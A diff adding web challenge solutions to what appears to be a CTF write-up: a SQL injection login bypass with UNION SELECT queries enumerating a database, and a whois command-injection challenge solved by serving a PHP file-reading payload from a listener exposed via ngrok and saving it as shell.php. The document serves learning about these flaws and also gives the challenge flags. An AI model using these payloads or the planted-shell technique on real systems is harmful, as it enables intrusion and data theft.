@@ -271,3 +271,142 @@ ZSteg yields the flag
 ---
 ![](./assets/misc/flag.png)  
 **Flag:** `UVT{Wh4t?!_D1d_Y0u_r3aLly_c4TcH_1t?}`
+
+## Web
+
+## Error=300
+![](.assets/web/error=300/task.png)
+
+### Goals
+---
+1. Understand how the web application works
+2. Find the flag in the web application
+3. Understand how the web application is vulnerable to SQL Injection
+4. Use SQL Injection to bypass the login system and get the flag
+
+### Solution
+1. The web application is a simple login system where you need to enter your username and password to log in.
+![](./assets/web/error=300/login.png)
+2. We can find out that the web login page is vulnerable to SQL Injection. We can use the following payload to bypass the login system:
+``` 'or 1=1-- ```
+3. After that, we can see there is another page that we need to access the sql database to get the flag.
+4. We can use the following SQL query to test the blind sql injection:
+- Test the length of the column name (test and error by adding NULL values):
+```sql
+' UNION SELECT NULL,NULL,NULL,NULL -- -
+```
+![](./assets/web/error=300/trycoloumnsize.png)
+- After that, we need to find the name of the database using the following query:
+```sql 
+` UNION SELECT NULL,NULL,NULL,schema_name FROM information_schema.schemata -- -
+```
+![](./assets/web/error=300/find%20database.png)
+- After that, we can find the name of the table name from that database using the following query:
+```sql
+' UNION SELECT NULL,NULL,NULL,table_name FROM information_schema.tables WHERE table_schema = 'sqli_challenge' -- -
+```
+![](./assets/web/error=300/tablenamesqlichallenge.png)
+- After that, we can find the name of the column name from that table using the following query:
+```sql
+' UNION SELECT NULL,NULL,NULL,column_name FROM information_schema.columns WHERE table_schema = 'sqli_challenge' -- -
+```
+![](./assets/web/error=300/coloumn%20sqli.png) 
+- After that, we can find the flag using the following query:
+```sql 
+' UNION SELECT NULL,flag,NULL,NULL FROM sqli_challenge.secrets-- -
+```
+![](./assets/web/error=300/1flag.png)
+
+5. Repeat the process for the second flag using the same method as above.
+and we will get the second flag.
+```sql
+' UNION SELECT NULL,NULL,NULL,table_name FROM information_schema.tables WHERE table_schema = 'password_reset' -- -
+' UNION SELECT NULL,NULL,NULL,column_name  FROM information_schema.columns WHERE table_schema = 'password_reset' -- -
+' UNION SELECT NULL,NULL,NULL,password FROM password_reset.users-- -
+```
+![](./assets/web/error=300/flag2.png)
+
+6. After that combine the two flags together to get the final flag.
+
+### Final Result
+**Flag:** `UVT{Th3_sy5t3M_7ru5Ts_1tS_oWn_9r4Mmar_..._S0_5tR1ng5_4r3_m0r3_tHaN_qu3r13s_1n_th3_3nd}`
+
+## Domain info
+![](./assets/web/domaininfo/task.png)
+
+### Goals
+---
+1. Analyze a PHP web application for security vulnerabilities
+2. Exploit command injection to read the flag
+3. Bypass security filters using creative techniques
+
+### Solution
+1. First, I analyzed the PHP code in the web application which allows users to execute whois commands:
+```php
+<?php
+$command = "whois -h " . $host . " -p " . $port . " " . $query . " > " . escapeshellarg($savepath);
+system($command);
+```
+2. The application had security measures in place:
+- It filters out common command injection characters like **;**,**&**,**|**,**$**, **(**, **)**, **< & > **
+- It validates the host is a valid IP or domain
+- It uses escapeshellarg() on some parameters
+```    // Basic anti-command injection filters
+    foreach ([$host, $port, $query, $savefile] as $input) {
+        if (preg_match('/[;&|`$()<>]/', $input)) {
+            die("<p style='color:red;'>❌ Command Injection Detected!</p>");
+        }
+    }
+```
+
+3. Setting up a local server to receive the whois command output:
+```bash
+import socket
+
+HOST = '0.0.0.0'   # Listen on all interfaces
+PORT = 1234         # Local port to run the server
+
+# PHP code to read the flag
+php_payload = '<?php echo file_get_contents("/flag.txt"); ?>'
+
+# Start the server
+with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+    s.bind((HOST, PORT))
+    s.listen()
+    print(f"Listening on {PORT}...")
+    while True:
+        conn, addr = s.accept()
+        with conn:
+            # Send the PHP payload immediately
+            conn.sendall(php_payload.encode())
+            print("Payload sent to:", addr)
+```
+4. I used ngrok to expose my local server to the internet:
+```bash
+ngrok tcp 1234
+```
+5. I submitted the form with these values:
+```plaintext
+host
+0.tcp.ap.ngrok.io
+
+port
+10965 *ngrok forwarding port will be given by ngrok
+
+query
+testing *this will be the query object anything will do
+
+filename
+shell.php 
+```
+6. This caused the server to execute the whois command and connect to my Python server:
+![](./assets/web/domain%20info/Screenshot%202025-05-04%20131911.png)
+![](./assets/web/domain%20info/Screenshot%202025-05-04%20131938.png)
+
+7. This payload was saved as a PHP file in the uploads directory, which I could then access to execute the code and view the flag by just pressing Click here to view your file.
+![](./assets/web/domain%20info/lastby.png)
+
+### Final Result
+---
+![](./assets/web/domain%20info/Screenshot%202025-05-04%20132143.png)
+**Flag:** `UVT{M4l1c10us_Wh0_1s_C0mmand_4nd_upl0ad}`
